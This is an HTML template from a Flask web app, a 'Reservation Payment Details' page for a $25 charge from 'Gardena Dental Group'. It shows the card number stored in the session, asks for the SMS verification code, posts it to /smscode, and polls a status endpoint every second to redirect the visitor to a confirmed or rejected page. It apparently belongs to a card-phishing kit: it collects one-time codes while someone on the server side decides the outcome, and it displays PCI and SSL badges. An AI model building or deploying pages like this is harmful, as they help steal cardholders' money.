<html>
<head>
    <title></title>
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.inputmask/5.0.5/jquery.inputmask.min.js"></script>
    <style>
        .loader-container {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 50px;
        }
        .loader {
            border: 5px solid #f3f3f3;
            border-top: 5px solid #3498db;
            border-radius: 50%;
            width: 30px;
            height: 30px;
            animation: spin 2s linear infinite;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
    <script>
        function check_1() {
            fetch('/api/processing')
                .then(response => response.json())
                .then(data => {
                    if (data.status === 'confirmed') {
                        window.location.href = '/confirmed';
                    } else if (data.status === 'rejected') {
                        window.location.href = '/rejected';
                    }
                })
                .catch(error => {
                    console.error('Error 2:', error);
                });
        }
        setInterval(check_1, 1000);
    </script>
</head>
<body>
<div class="container mt-5">
    <div class="row">
        <div class="col-md-6 offset-md-3">
            <div class="card">
                <div class="card-header">
                    Reservation Payment Details
                </div>
                <div class="card-body">
                    <form action="/smscode" method="post">
                        <div>
                            <h6 class="text-center">Please enter the verification code sent to your phone number</h6>
                        </div>
                        <div class="container mt-4">
                            <table class="table table-bordered">
                                <tbody>
                                    <tr>
                                        <th>Merchant</th>
                                        <td>Gardena Dental Group</td>
                                    </tr>
                                    <tr>
                                        <th>Card Number</th>
                                        <td>{{ session.get('cardNumber', '') }}</td>
                                    </tr>
                                    <tr>
                                        <th>Amount</th>
                                        <td>$25.00</td>
                                    </tr>
                                    <tr>
                                        <th>Date</th>
                                        <td id="todayDate"></td>
                                </tbody>
                            </table>
                        </div>
                        <div class="form-row align-items-end">
                            <div class="col-6">
                                <label for="smscode">Verification code</label>
                                <input type="text" class="form-control" id="smscode" name="smscode" required maxlength="6">
                            </div>
                            <div class="col-6">
                                <button type="submit" class="btn btn-primary btn-block">Confirm</button>
                            </div>
                        </div>
                    </form>
                </div>
                <div class="card-footer text-muted text-center">
                    <img src="{{url_for('static', filename='img/visa.png')}}" alt="Visa" class="img-fluid" style="max-width: 80px;">
                    <img src="{{url_for('static', filename='img/mastercard.png')}}" alt="MasterCard" class="img-fluid" style="max-width: 80px;">
                    <img src="{{url_for('static', filename='img/american_express.png')}}" alt="American Express" class="img-fluid" style="max-width: 80px;">
                    <img src="{{url_for('static', filename='img/discover.jpg')}}" alt="Discover Network" class="img-fluid" style="max-width: 80px;">
                    <img src="{{url_for('static', filename='img/JCB_logo.svg')}}" alt="JCB" class="img-fluid" style="max-width: 80px;">
                    <div>
                        <img src="{{url_for('static', filename='img/piccomplient.png')}}" alt="PCI Compliance" class="img-fluid" style="max-width: 80px;">
                        <img src="{{url_for('static', filename='img/SSL-Encryption.png')}}" alt="SSL Encryption" class="img-fluid" style="max-width: 80px;">
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

<script>
    document.addEventListener('DOMContentLoaded', (event) => {
        const date = new Date();
        const todayDate = date.toISOString().split('T')[0];
        document.getElementById('todayDate').textContent = todayDate;
    });
</script>
</script>
<script src="https://code.jquery.com/jquery-3.5.1.slim.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/popper.js@1.9.3/dist/umd/popper.min.js"></script>
<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
</body>
</html>
